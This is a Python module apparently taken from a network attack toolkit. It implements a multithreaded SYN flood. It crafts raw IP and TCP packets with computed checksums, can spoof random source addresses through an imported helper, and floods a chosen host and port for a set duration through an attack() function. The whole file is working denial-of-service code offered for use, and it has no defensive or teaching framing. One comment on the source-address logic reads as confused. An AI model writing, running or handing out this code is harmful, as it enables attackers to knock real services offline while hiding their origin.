import socket
import struct
import random
import threading
import time
from core.ip_spoof import random_ip

class SYNFlood:
    def __init__(self, target, port, threads, duration, spoof=False):
        self.target = target
        self.port = port
        self.threads = threads
        self.duration = duration
        self.spoof = spoof
        self.stop_event = threading.Event()

    def _checksum(self, data):
        if len(data) % 2 == 1:
            data += b'\x00'
        s = sum(struct.unpack('!%dH' % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return ~s & 0xffff

    def _build_ip_header(self, src, dst):
        ip_ihl = 5
        ip_ver = 4
        ip_tos = 0
        ip_tot_len = 20 + 20
        ip_id = random.randint(1, 65535)
        ip_frag_off = 0
        ip_ttl = 255
        ip_proto = socket.IPPROTO_TCP
        ip_check = 0
        ip_saddr = socket.inet_aton(src)
        ip_daddr = socket.inet_aton(dst)

        ip_ihl_ver = (ip_ver << 4) + ip_ihl
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        ip_check = self._checksum(ip_header)
        ip_header = struct.pack('!BBHHHBBH4s4s', ip_ihl_ver, ip_tos, ip_tot_len,
                                ip_id, ip_frag_off, ip_ttl, ip_proto, ip_check,
                                ip_saddr, ip_daddr)
        return ip_header

    def _build_tcp_header(self, src_ip, dst_ip, src_port, dst_port):
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0

        offset_res = (doff << 4) + 0
        tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, dst_port, seq, ack_seq, offset_res,
                                 tcp_flags, window, check, urg_ptr)

        # Pseudo header for checksum
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)

        pseudo_header = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        total = pseudo_header + tcp_header
        tcp_check = self._checksum(total)

        tcp_header = struct.pack('!HHLLBBHHH',
                                 src_port, dst_port, seq, ack_seq, offset_res,
                                 tcp_flags, window, tcp_check, urg_ptr)
        return tcp_header

    def _send_syn(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except Exception:
            return

        while not self.stop_event.is_set():
            src_ip = self.target if not self.spoof else random_ip()
            # Use target as source? Avoid reflection, use random source if spoof else local?
            if not self.spoof:
                src_ip = "0.0.0.0"
            src_port = random.randint(1024, 65535)
            ip_header = self._build_ip_header(src_ip, self.target)
            tcp_header = self._build_tcp_header(src_ip, self.target, src_port, self.port)
            try:
                sock.sendto(ip_header + tcp_header, (self.target, self.port))
            except Exception:
                pass

    def start(self):
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self._send_syn)
            t.daemon = True
            t.start()
            threads.append(t)

        time.sleep(self.duration)
        self.stop_event.set()
        for t in threads:
            t.join(timeout=1)

def attack(target, port, threads, duration, spoof=False):
    flood = SYNFlood(target, port, threads, duration, spoof)
    flood.start()
